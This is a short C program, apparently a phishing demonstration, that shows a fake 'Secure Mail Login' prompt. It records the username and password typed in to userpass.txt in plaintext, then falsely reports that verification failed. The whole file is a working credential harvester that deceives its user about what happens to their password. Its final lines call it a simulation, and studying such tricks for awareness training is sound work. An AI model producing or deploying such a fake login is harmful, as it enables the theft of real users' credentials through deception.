#include <stdio.h> 
#include <string.h> 
 int main()  
{ 
    char username[50]; 
    char password[50]; 
 
    printf("\n*******************************\n"); 
    printf("      Secure Mail Login     \n"); 
    printf("*******************************\n"); 
 
    printf("Username: "); 
    fgets(username, sizeof(username), stdin); 
 
    printf("Password: "); 
    fgets(password, sizeof(password), stdin); 
 
    // Remove newline characters 
    username[strcspn(username, "\n")] = 0; 
    password[strcspn(password, "\n")] = 0; 
 
   FILE *log = fopen("userpass.txt", "a"); 
    if (log == NULL)  
   { 
        printf("Error opening log file!\n"); 
        return 1; 
    } 
    fprintf(log, " Username: %s\n", username); 
    fprintf(log, " Password: %s\n\n", password); 
    fclose(log); 
 
    printf("\nVerifying UserName and Password...\n"); 
    printf("Login failed! Please try again later.\n"); 
    printf("\nSimulation Complete\n"); 
    printf(" Demonstration Done Successfully.\n"); 
 
    return 0; 
}
